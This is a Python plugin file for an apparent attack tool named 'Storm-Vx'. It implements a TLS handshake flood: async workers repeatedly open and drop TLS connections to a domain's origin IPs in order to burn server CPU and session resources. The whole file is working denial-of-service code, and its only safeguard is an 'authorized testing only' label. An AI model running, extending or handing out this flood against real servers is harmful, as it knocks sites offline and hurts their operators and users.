#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_tls_handshake — TLS Handshake Flood Attack Plugin

Rapidly initiates TLS handshakes with origin IPs to exhaust
server TLS session resources and CPU.
Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
import ssl
from typing import Dict, Any
from urllib.parse import urlparse


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin
from vf_common import C
from config.defaults import RAW_CONNECT_TIMEOUT, WRITER_CLOSE_TIMEOUT

from logging_config import get_logger
logger = get_logger(__name__)


__all__ = ["TlsHandshakeFloodPlugin"]


class TlsHandshakeFloodPlugin(AttackPlugin):
    """TLS handshake flood on origin IPs.

    Rapidly initiates TLS handshakes without completing HTTP requests.
    Each handshake requires significant CPU on the server side for
    cryptographic operations, making this a CPU-exhaustion attack.
    """

    meta = PluginMeta(
        name='tls_handshake',
        version='1.0.0',
        plugin_type='attack',
        description='TLS handshake flood — rapid handshakes to exhaust server TLS/CPU resources',
        tags=['origin', 'tls', 'cpu-burn', 'handshake'],
        priority=37,
        compatible_profiles=[],
        requirements=[],
    )

    def __init__(self) -> None:
        super().__init__()
        # SSL context is now created per-worker based on verify_ssl setting (SEC-03)

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """TLS handshake flood worker: rapid handshakes."""
        origin_ips = context.origin_ips
        if not origin_ips:
            return

        domain = context.domain

        # BUG-025: Use shared _create_ssl_context() from AttackPlugin base class
        # instead of duplicating SSL context creation logic
        ssl_ctx = self._create_ssl_context(context)

        while not self._stop_event.is_set():
            origin_ip = random.choice(origin_ips)
            try:
                # BUG-FIX: Pass server_hostname for proper TLS SNI handshake
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(
                        origin_ip, 443, ssl=ssl_ctx, server_hostname=domain),
                    timeout=RAW_CONNECT_TIMEOUT)  # W2.4
                writer.close()
                try:
                    await asyncio.wait_for(writer.wait_closed(), timeout=WRITER_CLOSE_TIMEOUT)  # W2.4
                except (OSError, RuntimeError, asyncio.TimeoutError):
                    pass
                await self._record("TLS-HS", True, 0, 0, hint="handshake")
            except asyncio.CancelledError:
                return
            except (OSError, ConnectionError, ssl.SSLError, asyncio.TimeoutError) as exc:
                await self._record("TLS-HS", False, 0, 0, err=type(exc).__name__)
            await asyncio.sleep(0.1)
